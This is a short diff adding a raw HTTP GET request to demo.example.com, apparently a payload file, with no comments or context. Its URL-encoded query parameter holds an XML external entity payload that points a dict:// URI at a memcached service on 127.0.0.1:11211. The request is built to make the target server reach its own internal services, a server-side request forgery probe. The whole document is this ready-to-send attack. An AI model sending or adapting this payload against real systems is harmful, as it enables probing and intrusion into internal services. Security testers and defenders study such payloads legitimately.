@@ -1,0 +1,4 @@
+GET /a?q=%3C%21DOCTYPE%2Br%2B%5B%3C%21ENTITY%2Bx%2BSYSTEM%2B%22dict%3A%2F%2F127.0.0.1%3A11211%2Fstat%22%3E%5D%3E%3Cr%3E%26x%3B%3C%2Fr%3E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
